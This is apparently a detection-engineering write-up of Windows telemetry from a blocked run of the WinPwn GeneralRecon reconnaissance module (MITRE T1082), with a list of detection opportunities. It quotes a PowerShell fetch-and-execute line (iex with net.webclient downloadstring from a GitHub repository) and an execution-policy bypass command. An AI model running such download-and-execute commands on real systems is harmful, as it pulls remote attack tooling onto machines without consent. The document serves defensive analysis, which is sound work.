# T1082-18: System Information Discovery — WinPwn - GeneralRecon

## Technique Context

T1082 System Information Discovery represents a fundamental reconnaissance technique where adversaries gather detailed information about the victim system and its configuration. This technique is critical in the early stages of post-exploitation activity, helping attackers understand their environment, identify potential privilege escalation paths, discover security controls, and plan lateral movement. The WinPwn framework's GeneralRecon module is a PowerShell-based information gathering tool that combines multiple system enumeration commands into a single automated reconnaissance suite. Detection engineers focus on identifying patterns of rapid, sequential system information queries that exceed normal administrative activity, particularly when executed through PowerShell with web-based script downloads.

## What This Dataset Contains

This dataset captures an attempt to execute WinPwn's GeneralRecon module, but Windows Defender blocks the technique before it can complete its system enumeration activities. The Security log shows the initial PowerShell process creation with Security EID 4688 containing the full command line: `"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'` followed by an `iex(new-object net.webclient).downloadstring()` call to retrieve the WinPwn script from GitHub. 

Sysmon captures the PowerShell process creation (EID 1) showing the same command line with additional process metadata. The technique execution shows a DNS query (Sysmon EID 22) to `raw.githubusercontent.com` indicating network-based script retrieval attempts. However, PowerShell EID 4100 reveals the critical blocking event: "This script contains malicious content and has been blocked by your antivirus software" with error ID `ScriptContainedMaliciousContent`. A single `whoami.exe` execution appears in both Security EID 4688 and Sysmon EID 1, representing the only successful system information gathering command before the blocking occurred.

The PowerShell channel primarily contains harmless boilerplate scriptblocks (`Set-StrictMode -Version 1`) and basic execution policy changes, with one substantive script block showing the actual WinPwn download attempt before Defender intervention.

## What This Dataset Does Not Contain

This dataset lacks the comprehensive system enumeration telemetry that would normally result from successful WinPwn GeneralRecon execution. You won't find the typical barrage of system information gathering commands like `systeminfo`, `net user`, `net group`, `wmic` queries, registry enumeration, or network configuration discovery that characterizes this technique when successful. The Windows Defender real-time protection blocked the malicious PowerShell script before it could download and execute the full reconnaissance payload, resulting in minimal actual system discovery activity. There are no file creation events for downloaded scripts, no extensive command-line audit trails showing enumeration commands, and no network connections beyond the initial DNS resolution for the script hosting domain.

## Assessment

This dataset provides limited value for understanding successful T1082 system information discovery patterns, as Windows Defender prevented the technique from executing its intended reconnaissance activities. However, it offers excellent visibility into the initial attack vector and blocking mechanisms. The Security 4688 events with full command-line logging effectively capture the PowerShell-based script download attempt, while Sysmon process creation and DNS query events provide additional attack sequence context. The PowerShell EID 4100 error event demonstrates how endpoint protection can generate valuable blocking telemetry. For detection engineering, this dataset is more valuable for understanding defense evasion attempts and endpoint protection bypasses than for building detections around successful system enumeration patterns.

## Detection Opportunities Present in This Data

1. **PowerShell Web-Based Script Downloads** - Security EID 4688 and Sysmon EID 1 showing `iex(new-object net.webclient).downloadstring()` patterns with suspicious GitHub repositories
2. **Malicious Content Blocking Events** - PowerShell EID 4100 with error ID `ScriptContainedMaliciousContent` indicating endpoint protection blocking attempts
3. **Suspicious Domain DNS Queries** - Sysmon EID 22 for `raw.githubusercontent.com` from PowerShell processes, especially when followed by script execution attempts
4. **Process Chain Analysis** - PowerShell spawning child PowerShell processes with encoded or obfuscated command lines containing web download functions
5. **Execution Policy Bypass Attempts** - PowerShell EID 4103 showing `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass` combined with web download activity
6. **Named Pipe Creation from PowerShell** - Sysmon EID 17 showing PowerShell host pipes that may indicate script execution environments
